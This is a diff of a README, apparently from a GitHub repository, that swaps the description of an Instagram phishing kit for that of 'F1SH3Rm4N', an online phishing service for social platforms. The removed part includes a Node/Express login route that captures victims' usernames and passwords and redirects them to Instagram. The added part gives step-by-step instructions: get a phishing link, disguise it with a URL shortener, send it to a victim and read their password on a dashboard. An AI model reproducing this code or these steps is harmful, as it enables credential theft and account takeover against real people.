@@ -1,45 +1,20 @@
-# Hack Ig
+# F1SH3Rm4N 🎣
 
-Phish Instagram Account 
+FISHER MAN is a phishing tool for various social platforms 👨‍💻
 
-This will contain a server file and index file [ instagram login page ]
-
-Wan't a demo ?? 
-https://fadhilsaheer.github.io/hack-ig/
+This tool is a online based so anyone can access it from any where 🌎
 
 
 
-## Setup
+## How to use this 🐺
 
-
-
-Install node_modules
-
-You should need node js and npm for running server
-
-```javascript
-npm install
-```
-
-
-
-Host or send html file [ index.html ]
-
-you will get the username and password if victim enter details
-
-```javascript
-// code from server
-app.get("/login", async(req, res) => {
-  let username = await req.query.username;
-  let password = await req.query.password;
-
-  console.log(`${username} : ${password}`); // show username and password in console
-
-  // do whatever with these
-  
-  res.redirect("http://instagram.com");//redirect as your wish
-});
-```
+<ul>
+    <li>Signup to FISHER MAN 🦈</li>
+    <li>You can copy phishing link from dashboard 🔗</li>
+    <li>Convert it with <a href="https://bitly.com/">Bitly</a> (Recommended) 😉</li>
+    <li>Send it to victim 📤</li>
+    <li>You can see victims password on dashboard 👨‍💻</li>
+</ul>
 
 
 
